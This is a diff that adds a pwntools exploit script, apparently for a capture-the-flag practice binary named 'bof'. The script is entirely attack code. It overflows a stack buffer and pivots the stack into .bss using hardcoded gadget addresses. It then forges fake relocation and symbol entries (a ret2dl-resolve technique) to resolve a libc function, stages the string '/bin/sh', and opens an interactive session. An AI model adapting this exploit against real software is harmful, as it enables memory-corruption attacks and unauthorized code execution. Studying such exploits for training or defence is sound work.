@@ -1,0 +1,39 @@
+from pwn import *
+
+sh = process("./bof")
+pwn = ELF("./bof")
+read = pwn.plt["read"]
+write = pwn.plt["write"]
+base_stage = pwn.bss() + 0x800
+pop_ebp_ret = 0x080492db
+ppp_ret = 0x080492d9
+leave_ret = 0x08049105
+payload1 = flat(['a'*(0x6c+4), read, ppp_ret, 0, base_stage, 0x100, pop_ebp_ret, base_stage, leave_ret])
+sh.sendline(payload1)
+
+cmd = "/bin/sh"
+plt0 = 0x08049020
+rel_plt = 0x08048364
+write_got = pwn.got["write"]
+index_offset = base_stage + 28 - rel_plt
+dynsym = 0x0804820c
+fake_sym_addr = base_stage + 36
+align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
+fake_sym_addr = fake_sym_addr + align
+sym_index = (fake_sym_addr - dynsym) / 0x10
+r_info = (sym_index << 8) | 7
+dynstr = 0x080482ac
+st_name = fake_sym_addr + 0x10 - dynstr
+fake_sym = flat([st_name, 0, 0, 0x12])
+fake_reloc = flat([write_got, r_info])
+payload2 = "aaaa"
+payload2 += flat([plt0, index_offset, "aaaa", 1, base_stage+0x80, len(cmd)])
+payload2 += fake_reloc
+payload2 += 'a' * align
+payload2 += fake_sym
+payload2 += "write\x00"
+payload2 = payload2.ljust(0x80, 'a')
+payload2 += cmd + '\x00'
+payload2 = payload2.ljust(0x100, 'a')
+sh.sendline(payload2)
+sh.interactive()
